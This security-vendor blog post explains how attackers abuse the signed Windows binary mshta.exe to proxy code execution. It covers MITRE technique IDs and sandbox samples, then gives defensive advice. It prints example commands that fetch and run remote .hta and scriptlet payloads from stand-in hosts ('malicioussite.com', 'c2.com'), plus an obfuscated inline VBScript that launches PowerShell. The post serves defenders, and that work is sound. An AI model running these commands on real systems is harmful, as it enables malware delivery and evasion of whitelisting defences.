@@ -1,0 +1,55 @@
+There is a growing trend for attackers to more heavily utilize tools that already exist on a system rather than relying totally on their own custom malware.
+Using .hta files or its partner in crime, mshta.exe, is an alternative to using macro enabled document for attacks and has been around a long time.
+It is a tool so flexible it even has its own cell on the MITRE ATT&CK matrix.
+To start, it is a signed, native Microsoft binary that already exists on Windows that can execute code in a variety of ways, and in today’s living off the land culture that attackers love, this makes it a prime application of interest since code execution can be proxied through it.
+Mshta.exe can also be used to bypass application whitelisting defenses and browser security settings.
+These types of binaries have been colloquially dubbed “LOLBINs” but more formally have been turned into techniques within the Mitre tactic of Execution.
+Techniques T1218 and T1216: Signed binary proxy execution and Signed Script Proxy Execution, respectively.
+[1]
+How It Is Used:
+The most interesting abuse of native Windows binaries is the ability to run a program that will either execute passed in code, or that will execute a payload hosted remotely.
+This was quite popular with Casey Smith’s squibblydoo and squiblytwo attacks where regsvr32 and wmic (also considered LOLBINs) were both found to be signed windows binaries able to execute code hosted remotely.
+Example 1: A remote file being executed:
+mshta.exe http://malicioussite.com/superlegit.hta
+Example 2: Mshta used to execute inline JScript/Vbscript.
+Note: this syntax only works in cmd but will give an error if executed in PowerShell.
+mshta vbscript:(CreateObject(“WS”+”C”+”rI”+”Pt.ShEll”)).Run(“powershell”,1,True)(window.close)
+Example 3: Calling a public method named Exec in a com scriptlet with JavaScript:
+mshta javascript:a=GetObject(“script:http://c2.com/cmd.sct”).Exec()
+source : https://gist.githubusercontent.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba/raw/6cb52b88bcc929f5555cd302d9ed848b7e407052/Backdoor.sct
+Note: notice the similarities between the usage of mshta with the exec method and the corresponding use in regsvr32 in the above gist.
+Alternatively, a file with a .hta extension can just as easily be double clicked on by the user where the code is set to autorun on open much like a macro enabled document.
+Availability in Public Tools
+There is no shortage of easily accessible repos to help someone quickly generate a payload to use mshta.
+.hta file type generation is available in nearly all public red-teaming tools such as Empire, Metasploit, Unicorn, and Koadic.
+Do not forget, however, that mshta’s use is not limited to .hta files.
+It can also call code registered inside of com scriptlets (.sct) so it is relevant to other tools such as GreatSCT.
+It’s also worth noting that even if you have powershell.exe blocked, tools like nps payload have .hta files that dynamically build a project and compile it with msbuild (another tool to be weary of) to create a tool that can execute powershell commands without using powershell.exe at all.
+In The Wild:
+One of my favorite tools to look for examples is app.any.run.
+It is an interactive online sandbox and is a great resource for finding new samples.
+You can even filter by MITRE ATT&CK Technique which is what I did here:
+As you can see, there is no shortage of samples to go through.
+Another interesting detail is we can see several different file extensions used outside of the standard .hta and even some where the sandbox has found there are no threats detected.
+Is that true though?
+Here we can see it has a dubious name of windows-update.hta running from a temp folder.
+This looks to be a binary embedded within an .hta file to trick automated sandbox detection.
+Here we look at another sample with no threats detected.
+sha256: 0ab797e7546eaf7bf40971a1f5f979355ed77a16124ae749ef1e90b81e4a3f88
+We see multiple file extensions used in the name to try and fool end users into thinking it is a picture.
+The script appears to be using WMI to spawn a new process which breaks the “expected” process chain of mshta > PowerShell and can allow malware to bypass rules that look for a direct process relationship such as Word > PowerShell.
+We can also see the sandbox believes this is not malicious based on its scoring.
+Luckily, we can look at the PowerShell code that it spawns and get a better idea.
+Process tree for 0ab797e7546eaf7bf40971a1f5f979355ed77a16124ae749ef1e90b81e4a3f88
+So, mshta can also be used to execute vbscript and WMI to break the process tree chain and launch PowerShell.
+And in the below example you can see mshta’s role in continuing part of an infection chain in common malware.
+Use of exploit then using mshta to execute remote code spawning the rest of the infection chain
+One of the easiest things you can implement is to change the default applications for files with an .hta extension from mshta.exe to a plain text editor such as notepad to help keep users from unwittingly double clicking a malicious .hta attachment
+If you are a McAfee customer, McAfee Endpoint Security (ENS) provides rules 322, which is now enabled by default, and 324 that can be enabled in ePO to help protect your environment against malicious mshta abuse.
+[2]
+You should also spend some time exploring where abusable native binaries like mshta.exe are used in your environment.
+If there are no business needs that require it, blocking it outright is advised.
+If it is required, understand where and why so you can find the systems running things like mshta.exe that aren’t expected to be.
+For more insights and tips like these subscribe to this blog or check out the latest threats from our Threat Center.
+[1] For a more complete list of these see: https://lolbas-project.github.io/
+[2] Located within the Advanced Threat Protection module of ENS
